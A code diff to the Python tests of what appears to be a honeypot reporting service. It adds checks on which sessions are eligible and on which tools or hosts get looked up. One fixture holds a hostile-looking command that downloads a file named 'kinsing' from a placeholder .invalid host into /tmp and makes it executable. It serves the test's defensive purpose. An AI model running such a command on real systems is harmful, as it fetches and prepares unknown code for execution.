@@ -44,6 +44,17 @@ def test_gating_requires_login_tripwire_or_download():
     s2 = Session("y", source="wild", tripwires=[{"id": "t"}])
     assert rep.eligible(s2)
     assert not rep.eligible(Session("z", source="guest", logins=[{"ts": 0, "username": "g", "success": True}]))
+    assert rep.eligible(Session("t", source="team", logins=[{"ts": 0, "username": "t", "success": True}]))
+
+
+def test_team_sessions_look_up_tools_but_never_their_own_ip():
+    rep = service()
+    s = Session("x", source="team", src_ip="1.2.3.4", ip_hash="a" * 64)
+    s.add_login(0, "team", True)
+    assert rep.targets(s, {"type": "login_success", "detail": {}}) == []
+    raw = {"type": "command", "detail": {"input": "cd /tmp; wget http://dl.bot-sim.invalid/kinsing; chmod +x kinsing"}}
+    # the reserved .invalid host isn't worth a search either
+    assert [(t.kind, t.label) for t in rep.targets(s, raw)] == [("tool", "kinsing")]
 
 
 async def test_failed_login_scan_never_searches():
